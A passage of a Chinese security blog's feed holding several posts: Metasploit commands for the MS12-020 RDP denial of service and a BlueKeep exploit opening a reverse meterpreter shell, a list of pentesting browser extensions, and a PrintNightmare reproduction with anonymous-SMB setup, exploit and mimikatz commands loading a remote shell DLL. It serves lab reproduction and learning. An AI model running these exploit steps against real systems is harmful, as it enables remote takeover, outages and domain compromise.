报文访问未初始化或已经删除的对象，导致任意代码执行</p><p>在 Metasploit 中有两个该漏洞的利用模块：</p><p>首先为了确定目标主机是否容易受到该漏洞的影响，可以先使用第二个命令来进行检测：</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/rdp/ms12_020_checkset rhosts 192.168.93.20set rport 3389exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>目标机存在漏洞，然后尝试使用第一个模块进行攻击，这将对目标系统发起 DOS 攻击，最终导致目标系统蓝屏：</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/dos/windows/rdp/ms12_020_maxchannelidsset rhosts 192.168.93.20set rport 3389exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从上图中可以看到目标系统是由于某些问题导致系统正在关闭。DoS 攻击执行者通常攻击托管在诸如银行或信用卡支付网关等高端 Web 服务器上的站点或服务，通过暂时或无限期地中断连接 Internet 的主机服务，使其目标用户无法使用机器或网络资源。</p><h2 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows 远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。</p><p>此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与 2017 年 WannaCry 恶意软件的传播方式类似。</p><p>它影响了某些旧版本的 Windows 系统，包括：  </p><ul><li>Windows 7</li><li>Windows server 2008 R2</li><li>Windows server 2008</li><li> Windows 2003</li><li>Windows xp</li></ul><p>在 Metasploit 中已经有了该漏洞的利用模块：</p><p>第一个模块用来检测目标机是否存在漏洞，第二个模块用来进行攻击。设置好参数直接利用即可：</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset payload windows/x64/meterpreter/reverse_tcpset rhosts 192.168.93.20set lhost 192.168.93.128set rdp_client_ip 192.168.93.20unset RDP_CLIENT_NAMset target 2    # 这里的 2 代表目标机为虚拟机环境exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651126707&amp;idx=1&amp;sn=4a98914e6d423af388e4c1747e5c64d5">内网渗透测试：初探远程桌面的安全问题</a></p><p><a href="https://blog.csdn.net/wudinaniya/article/details/80978436">出现身份验证错误，要求的函数不受支持</a></p><p><a href="https://xz.aliyun.com/t/9673">后渗透之权限维持 – 隐藏用户的创建和使用 - 先知社区</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE">渗透技巧——从远程桌面客户端提取明文凭据</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 知识总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RDP安全 </tag>
            
            <tag> 远程桌面 </tag>
            
            <tag> 知识总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器插件分享</title>
      <link href="posts/29502.html"/>
      <url>posts/29502.html</url>
      
        <content type="html"><![CDATA[<p>分享几款日常使用较多的浏览器插件和一些常用于渗透测试的浏览器插件</p><p>更多好玩的插件请查看：<a href="https://github.com/zhaoolee/ChromeAppHeroes">Chrome插件英雄榜</a></p><h3 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h3><h4 id="Surfingkeys"><a href="#Surfingkeys" class="headerlink" title="Surfingkeys"></a>Surfingkeys</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg">https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg</a>  </p><h4 id="扩展管理器（Extension-Manager）"><a href="#扩展管理器（Extension-Manager）" class="headerlink" title="扩展管理器（Extension Manager）"></a>扩展管理器（Extension Manager）</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco">https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco</a></p><h4 id="OneTab-Extension"><a href="#OneTab-Extension" class="headerlink" title="OneTab Extension"></a>OneTab Extension</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm">https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm</a>  </p><h4 id="清除历史记录和Web缓存"><a href="#清除历史记录和Web缓存" class="headerlink" title="清除历史记录和Web缓存"></a>清除历史记录和Web缓存</h4><p>下载地址：<br><a href="https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg">https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg</a></p><h4 id="AdBlock插件"><a href="#AdBlock插件" class="headerlink" title="AdBlock插件"></a>AdBlock插件</h4><p>这是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具，可以过滤掉网页上的大部分广告：浮动广告，购物广告，恶意弹窗，跟踪代码，这款插件适用于过滤国内网站的广告，国外网站的广告建议使用AdBlock插件。</p><h4 id="简悦-SimpRead"><a href="#简悦-SimpRead" class="headerlink" title="简悦 - SimpRead"></a>简悦 - SimpRead</h4><p>让你瞬间进入沉浸式阅读的 Edge 扩展，类似 Safari 的阅读模式。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E7%AE%80%E6%82%A6-simpread/clgdhlhfiocphghdkdbgdlmfaafccfmc">简悦 - SimpRead - Microsoft Edge Addons</a></p><h4 id="沙拉查词-聚合词典划词翻译"><a href="#沙拉查词-聚合词典划词翻译" class="headerlink" title="沙拉查词-聚合词典划词翻译"></a>沙拉查词-聚合词典划词翻译</h4><p>Saladict 沙拉查词是一款专业划词翻译扩展，为交叉阅读而生。大量权威词典涵盖中英日韩法德西语，支持复杂的划词操作、网页翻译、生词本与 PDF 浏览。</p><p>下载地址<br><a href="https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp">https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp</a></p><h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>懂的都懂</p><p>脚本推荐：</p><ul><li><p><a href="https://greasyfork.org/zh-CN/scripts/24508-userscript-show-site-all-userjs">Userscript+ : 显示当前网站所有可用的UserJS脚本 Jaeger</a></p></li><li><p><a href="https://greasyfork.org/zh-CN/scripts/2998-search-by-image">Search By Image | 以图搜图</a></p></li></ul><h4 id="谷歌上网助手"><a href="#谷歌上网助手" class="headerlink" title="谷歌上网助手"></a>谷歌上网助手</h4><p>这是一款专门为科研、外贸、跨境电商、海淘人员、开发人员服务的上网加速工具，Chrome内核浏览器专用，可以解决Chrome扩展无法自动更新问题，一键安装，无需其他配置即可访问以下服务，但是会与“Proxy SwitchyOmega”这类代理插件冲突。</p><ul><li>Google搜索：<a href="https://www.google.com/">https://www.google.com</a></li><li>Gmail邮箱：<a href="https://mail.google.com/">https://mail.google.com</a></li><li>Chrome商店访问以及Google+等服务等。</li></ul><h4 id="类似的网站-发现相关网站"><a href="#类似的网站-发现相关网站" class="headerlink" title="类似的网站 - 发现相关网站"></a>类似的网站 - 发现相关网站</h4><p>立即发现与您当前正在浏览的网站类似的网站。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn">类似的网站 - 发现相关网站 - Chrome 网上应用店 (google.com)</a></p><h4 id="百度文库免费下载"><a href="#百度文库免费下载" class="headerlink" title="百度文库免费下载"></a>百度文库免费下载</h4><p>这是一款百度文档免下载券下载文档的插件，可以导出PDF文字和图片，能屏蔽文档中的广告，支持Word、PPT、PDF文档，只要能试读的页面都能下载到，能分页下载完整的文档，非常稳定可靠</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD/imjoocoajfjgnabmlbgpcnpieibibhmd">百度文库免费下载 - Chrome 网上应用店 (google.com)</a></p><h4 id="Desktop-Messenger-for-Telegram"><a href="#Desktop-Messenger-for-Telegram" class="headerlink" title="Desktop Messenger for Telegram"></a>Desktop Messenger for Telegram</h4><p>这是一款非官方开发和维护的Telegram Web客户端插件，可直接通过点击插件图标来进行登录和收发信息，有好友发送信息时也会有消息通知。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/desktop-messenger-for-tel/dafiggkhlbbhfcpgggcfeeoliillkabn">Desktop Messenger for Telegram™ - Chrome 网上应用店 (google.com)</a></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>这个插件可以自动探测当前网站所属的国家、城市，解析 IP 地址以及开放的服务和端口，包括但不限于 FTP、DNS、SSH 或者其他服务等，属被动信息搜集中的一种。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap">Shodan - Chrome 网上应用店</a></p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>这个插件可用于指纹识别，能够检测出当前网站使用的 Web 框架和 CMS、CDN、统计、中间件、编程语言以及 JavaScript 框架和库等等相关信息。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg">Wappalyzer - Chrome 网上应用店</a></p><h4 id="FOFA-Pro-View"><a href="#FOFA-Pro-View" class="headerlink" title="FOFA Pro View"></a>FOFA Pro View</h4><p>这个插件比 Shodan 搜集到的信息更全，能够检测出当前网站的托管位置（国家 / 地区 / 城市）、组织、ASN、端口、协议和相关资产等信息。</p><p>项目地址：https : //github.com/fofapro/fofa_view</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/fofa-pro-view/dobbfkjhgbkmmcooahlnllfopfmhcoln">FOFA Pro View - Chrome 网上应用店</a></p><h4 id="IP-DNS-amp-Security-Tools"><a href="#IP-DNS-amp-Security-Tools" class="headerlink" title="IP, DNS &amp; Security Tools"></a>IP, DNS &amp; Security Tools</h4><p>这个插件是直接调用 <a href="https://hackertarget.com/">https://hackertarget.com</a> 官网接口来进行查询的，如果长时间不出查询结果时可能就得上 “墙” 了，可查询的信息包括有：IP、路由、DNS、Whios、指纹、HTTP 头、同服等。</p><h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa">https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa</a></p><h4 id="anti-honeypot"><a href="#anti-honeypot" class="headerlink" title="anti-honeypot"></a>anti-honeypot</h4><p>用来检测 WEB 蜜罐并中断请求，能够识别并中断长亭 D-sensor 和墨安幻阵的部分溯源 API。</p><p>项目地址：<a href="https://github.com/Ar3h/anti-honeypot">https://github.com/Ar3h/anti-honeypot</a></p><h3 id="改包发包"><a href="#改包发包" class="headerlink" title="改包发包"></a>改包发包</h3><h4 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h4><p>这个插件可用于常见编码 / 解码、POST/Cookies 数据提交、SQL/XSS/LFI/XXE 漏洞测试、自定义 Referer/User-Agent 等，是一款不可多得的渗透测试人员必备插件，虽然现在作者已经收费了，但还是能够绕过其限制的。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc">https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><h4 id="DenisPodgurskii-pentestkit"><a href="#DenisPodgurskii-pentestkit" class="headerlink" title="DenisPodgurskii/pentestkit"></a>DenisPodgurskii/pentestkit</h4><p>下载地址：<br><a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a></p><h4 id="Penetration-Testing-Kit"><a href="#Penetration-Testing-Kit" class="headerlink" title="Penetration Testing Kit"></a>Penetration Testing Kit</h4><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd">https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd</a></p><h4 id="HTTP-Header-Live"><a href="#HTTP-Header-Live" class="headerlink" title="HTTP Header Live"></a>HTTP Header Live</h4><p>这个插件可用于捕获网页中加载的全部网页流量数据包，并且支持编辑和重发，就是 UI 差了点，大部分的同类插件都只能查看，不能编辑和重放。</p><h3 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h3><h4 id="Hack-Tools"><a href="#Hack-Tools" class="headerlink" title="Hack-Tools"></a>Hack-Tools</h4><p>payload快速生成，编码解码</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a>d3coder</h4><p>这个插件可用于各种类型的编码和解码，例如 URI、Hex、Base64，Rot13 或 Unix 时间戳等编码之间的相互转换。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder - Chrome 网上应用店 (google.com)</a></p><h4 id="Set-Character-Encoding"><a href="#Set-Character-Encoding" class="headerlink" title="Set Character Encoding"></a>Set Character Encoding</h4><p>这个插件可用来修改当前浏览器的编码，当浏览器编码与网页编码不一致时就会出现乱码的情况，最后吐槽一下这个新版谷歌浏览器的编码设置是真不好找。</p><p><a href="https://chrome.google.com/webstore/detail/set-character-encoding/bpojelgakakmcfmjfilgdlmhefphglae">Set Character Encoding - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/charset/oenllhgkiiljibhfagbfogdbchhdchml">Charset - Chrome 网上应用店 (google.com)</a></p><h4 id="EditThisCookie"><a href="#EditThisCookie" class="headerlink" title="EditThisCookie"></a>EditThisCookie</h4><p>这个插件可以帮助我们轻松管理谷歌浏览器上的各种 Cookies，支持添加，删除，编辑，搜索，锁定、屏蔽、保护和拦截 Cookies！</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">EditThisCookie - Chrome 网上应用店 (google.com)</a></p><p><a href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm">Cookie-Editor - Chrome 网上应用店 (google.com)</a></p><h4 id="X-Forwarded-For-Header"><a href="#X-Forwarded-For-Header" class="headerlink" title="X-Forwarded-For Header"></a>X-Forwarded-For Header</h4><p>请求ip伪造</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/x-forwarded-for-header/hkghghbnihliadkabmlcmcgmffllglin">X-Forwarded-For Header - Chrome 网上应用店 (google.com)</a></p><h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>这个插件可以帮助我们快速管理和切换多个代理设置，支持的代理协议有：HTTP/HTTPS、Socks4/Socks5，这也是一款渗透测试人员（抓包、上 “墙”）必备插件，谷歌上网助手插件也具备这样的代理设置功能。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Proxy SwitchyOmega - Chrome 网上应用店 (google.com)</a></p><h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>这个插件可用来模拟指定 User-Agent 去访问网站，有的开发人员在编写代码过程中会设置仅允许移动端 User-Agent 访问，一些做黑帽 SEO 的也经常使用这种方式来限制 PC 端访问。这款插件在 Chrome 网上应用商店中已经下架了，有需要的可以找我。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg">User-Agent Switcher for Chrome - Chrome 网上应用店 (google.com)</a></p><h4 id="NoScript"><a href="#NoScript" class="headerlink" title="NoScript"></a>NoScript</h4><p>这个插件可用于禁止浏览器加载和解析 JS 代码，也可以通过以下两种方式禁止执行 JS，常见应用场景有：禁用 JS 后台越权、禁用 JS 白名单上传等。</p><ul><li>  Firefox：about:config-&gt;javascript.enabled    </li><li>  Chorme：chrome://settings/content/javascript</li></ul><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/noscript/doojmbjmlfjjnbmnoijecmcbfeoakpjm">NoScript - Chrome 网上应用店 (google.com)</a></p><h4 id="JWT-Debugger"><a href="#JWT-Debugger" class="headerlink" title="JWT Debugger"></a>JWT Debugger</h4><p>JWT Debugger 是一款可以编码、验证和生成JWT的开发工具，官方提供了调试工具,我们可以很方便的看到JWT token各个组成部分解码后的信息,以及是否能验证成功。</p><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/jwt-debugger/ppmmlchacdbknfphdeafcbmklcghghmd">JWT Debugger - Chrome 网上应用店 (google.com)</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="Elasticvue"><a href="#Elasticvue" class="headerlink" title="Elasticvue"></a>Elasticvue</h4><p>Elasticsearch 服务未授权访问漏洞进行利用</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/elasticvue/hkedbapjpblbodpgbajblpnlpenaebaa">Elasticvue - Chrome 网上应用店 (google.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> 浏览器插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PrintNightmare(CVE-2021-1675/CVE-2021-34527)复现</title>
      <link href="posts/29501.html"/>
      <url>posts/29501.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote><p>此漏洞一开始为CVE-2021-1675，随后微软把此漏洞分配给了CVE-2021-34527,并提到了两个漏洞很像，但是攻击向量是不同的。<br>详见: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527 - 安全更新程序指南 - Microsoft - Windows 打印后台处理程序远程执行代码漏洞</a><br>cve-2021-1675的更新补丁只是修复了本地提权利用，远程代码执行还是可以利用。</p></blockquote><p>Github 公布的地址：<a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a></p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul><li><p>Windows 7 </p></li><li><p>Windows 8.1 </p></li><li><p>Windows 10</p></li><li><p>Windows Server 2008 R2 </p></li><li><p>Windows Server 2012</p></li><li><p>Windows Server 2016</p></li><li><p>Windows Server 2019</p></li></ul><h1 id="漏洞准备"><a href="#漏洞准备" class="headerlink" title="漏洞准备"></a>漏洞准备</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>一个普通权限的域账户</li><li>目标开启Spooler服务</li><li>创建的smb服务允许匿名访问，即目标可以直接获取到文件</li></ul><p>首先创建一个可以允许匿名访问的 smb, 在域控上必须能直接获取到文件<br>windows系统创建方法：</p><p>三好学生大佬的脚本: <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">3gstudent/Invoke-BuildAnonymousSMBServer: Use to build an anonymous SMB file server.</a></p><p>cube0x0作者给的脚本, 复制下面信息到一个PS1文件中，管理员权限运行该powershell脚本：</p><pre class="line-numbers language-none"><code class="language-none">// powershell版本过低的话会报错mkdir C:\shareicacls C:\share\ /T /grant Anonymous` logon:ricacls C:\share\ /T /grant Everyone:rNew-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipesREG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f# Reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali配置smb共享</p><p>参考：<a href="https://www.cnblogs.com/qingwuyou/p/10687452.html">复现CVE-2021-1675 - Rainbovv - 博客园</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>workgroup <span class="token operator">=</span> WORKGROUPserver string <span class="token operator">=</span> Samba Servernetbios name <span class="token operator">=</span> MYSERVERlog <span class="token function">file</span> <span class="token operator">=</span> /var/log/samba/log.%mmax log size <span class="token operator">=</span> <span class="token number">50</span>security <span class="token operator">=</span> usermap to guest <span class="token operator">=</span> Bad User<span class="token punctuation">[</span>smb<span class="token punctuation">]</span>comment <span class="token operator">=</span> Template Directoriesbrowseable <span class="token operator">=</span> <span class="token function">yes</span>writeable <span class="token operator">=</span> <span class="token function">yes</span>path <span class="token operator">=</span> /tmp/guest ok <span class="token operator">=</span> <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置完毕以后，需要执行命令开启samba服务即可</p><p><code>service smbd start</code></p><h2 id="常见报错"><a href="#常见报错" class="headerlink" title="常见报错"></a>常见报错</h2><h3 id="pDriverPath无法枚举问题"><a href="#pDriverPath无法枚举问题" class="headerlink" title="pDriverPath无法枚举问题"></a>pDriverPath无法枚举问题</h3><p>虽然最新版exp可以自动枚举驱动目录，但我安装的WinServer2019版本会报错枚举失败，如果失败的话就只能手动置顶py脚本中的pDriverPath变量值，并把上一句注释掉。</p><pre class="line-numbers language-none"><code class="language-none">#blob = getDrivers(dce, handle)``pDriverPath = ‘自定义路径+\\UNIDRV.DLL'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dll加载问题"><a href="#dll加载问题" class="headerlink" title="dll加载问题"></a>dll加载问题</h3><pre class="line-numbers language-none"><code class="language-none">1.exp执行完毕没有报错，但是就是不上线// 需要检查dll是否是64位，建议重新生成64位dll测试，dll并未执行，验证用户不是普通域用户账号。2.exp执行过程报错“DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied”。 // 检查smb共享是否可以匿名访问。3.exp执行过程报错“DCERPCSessionError: RPRN SessionError: code: 0x3 - ERROR_PATH_NOT_FOUND - The system cannot find the path specified.” // 检查dll加载地址，kali下用单引号, windows 用双引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>python版本的   <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a><br>C#版：            <a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare</a><br>C++版本的      <a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a><br>本地提权版：   <a href="https://github.com/hlldz/CVE-2021-1675-LPE">https://github.com/hlldz/CVE-2021-1675-LPE</a><br>mimikatz:        <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210709">2.2.0 20210709 Printnightmare rewrited</a></p><h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><ol><li>首先搭建一个SMB匿名共享，放恶意dll文件。  </li><li>工具运行后会先检测<code>C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_xx </code>文件名，自动替换。</li><li>然后远程拉取我们设置的匿名共享的恶意dll文件执行</li></ol><h2 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h2><p>其中python版本的exp需要按照说明文档安装exp作者的impacket库，其余不需要修改任何东西。</p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>rpcdump.py</code>来扫描潜在的易受攻击的主机，如果它返回一个值，它可能是易受攻击的<br>协议：[MS-RPRN]：打印系统远程协议  </p><pre class="line-numbers language-none"><code class="language-none">kalipython3 rpcdump.py @192.168.0.1 | grep MS-RPRNwinpython3 rpcdump.py @192.168.0.1 | findstr MS-RPRN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行利用，这里使用 dll 是 cs 生成的 dll</p><pre class="line-numbers language-none"><code class="language-none">winpython3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 "\\192.168.0.2\smb\shell.dll"kalipython3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 '\\192.168.0.2\smb\shell.dll'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><pre class="line-numbers language-none"><code class="language-none">mimikatz.exemisc::printnightmare /server:192.168.0.1 /authuser:localuser /authpassword:pass /library:\\192.168.0.2\smb\shell.dll /nodynamic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h2><p>没测试，需要改源码，参考一下。</p><p>推荐使用其他工具，可以自动枚举路径。</p><pre class="line-numbers language-none"><code class="language-none">//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_[受害机特有的]\\Amd64\\UNIDRV.DLL";info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL";剩下是将含有old的路径改为 C:\\Windows\\System32\\spool\\drivers\\x64\\%s。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html</a><br><a href="https://www.cnblogs.com/Rainbovv/p/14966438.html">复现CVE-2021-1675</a><br><a href="https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w">https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w</a><br><a href="https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ">https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ</a><br><a href="https://mp.weixin.qq.com/s/tMTIsijirsPc46CZVtcWQg">CVE-2021-1675 打印机漏洞沦陷域控的补充 07/02/21</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PrintNightmare </tag>
            
            <tag> CVE-2021-1675 </tag>
            
            <tag> CVE-2021-34527 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP图形化综合利用工具</title>
      <link href="posts/54917.html"/>
      <url>posts/54917.html</url>
      
